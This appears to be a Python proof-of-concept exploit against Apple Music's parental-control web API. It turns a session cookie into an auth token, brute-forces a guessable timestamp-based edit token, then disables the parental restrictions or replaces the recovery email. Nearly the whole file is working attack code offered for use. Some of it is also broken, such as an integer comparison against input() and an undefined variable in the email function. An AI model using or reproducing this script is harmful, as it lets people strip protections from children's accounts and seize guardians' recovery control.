import base64
import requests
import time

ts = time.time()
tsa=str(ts)
tsd=tsa[4:5]
orv=str(tsd)
orp=str(int(tsd)+1)
orm=str(int(tsd)-1)

print("login into music.apple.com ")
accinf=input("Enter value of myacinfo from cookies: ")

#Getting commerce auth token from myaccinfo
burp2_url = "https://buy.music.apple.com:443/account/web/auth"
burp2_cookies = {"myacinfo": str(accinf)}
burp2_headers = {"User-Agent": "", "Content-Type": "application/json", "Origin": "https://music.apple.com", "Connection": "close"}
burp2_json={"webAuthorizationFlowContext": "music"}
aaa=requests.post(burp2_url, headers=burp2_headers, cookies=burp2_cookies, json=burp2_json)
ddd=(aaa.headers.get("Set-Cookie"))
ctoke=(ddd[29:341])
print("Your ctoke is :" + str(ctoke))

tsi=input("Enter value of DSID from step 1 : ")

def aple(aci,ctok,ddsid,rrv):
    for i in range(99):
        b="""{"creationTimestamp":1688"""
        c=str(rrv)+str(f"{i:02}")+"""490821,"dsid":\""""
        e=str(ddsid)+"""\","country":"143467","familyId":"""
        d="""null}"""
        fin=b+c+e+d
        print(fin)
        data_bytes = str(fin).encode('utf-8')
        encrypted_data = base64.b64encode(data_bytes).decode('utf-8')
        burp0_url = "https://amp-account.music.apple.com:443/account/parentalControls/settings/edit"
        burp0_cookies = {"myacinfo": str(aci), "commerce-authorization-token": str(ctok)}
        burp0_headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Origin": "https://music.apple.com"}
        burp0_json={"editToken": str(encrypted_data), "musicRestriction": "EXPLICIT"}
        acr=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
        if(acr.status_code==204):
            print("found it , YAY")
            print(encrypted_data)
            inn=input("Enter 1 to change the email address, and 2 to disble to restriction")
            if (inn==1):
                edi(str(aci),str(ctok),str(encrypted_data))
            else:
                dis(str(aci),str(ctok),str(encrypted_data))
        if(acr.status_code==401):
            print("Do this step again, close the script")

#to change perentail control reocvery email
def edi(accinf,ctoke,encd):
    emil=input("Enter email you want to add to recovery :")
    burp0_url = "https://amp-account.music.apple.com:443/account/parentalControls/recoveryEmail/edit"
    burp0_cookies = {"myacinfo": str(accinf), "commerce-authorization-token": str(ctoke)}
    burp0_headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Origin": "https://music.apple.com"}
    burp0_json={"editToken": str(encd), "recoveryEmail":str(emil)}
    acrd=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
    if(acr.status_code==204):
            print("Email changed")
    if(acr.status_code==401):
            print("Failed Try again")

#to disable perental control
def dis(accinf,ctoke,encd):
    burp0_url = "https://amp-account.music.apple.com:443/account/parentalControls/disable"
    burp0_cookies = {"myacinfo": str(accinf), "commerce-authorization-token": str(ctoke)}
    burp0_headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Origin": "https://music.apple.com"}
    burp0_json={"editToken": str(encd)}
    acrd=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
    if(acrd.status_code==204):
            print("Disabled , enjoy !")
    if(acrd.status_code==401):
            print("Failed Try again")

aple(accinf,ctoke,tsi,orv)
aple(accinf,ctoke,tsi,orp)
aple(accinf,ctoke,tsi,orm)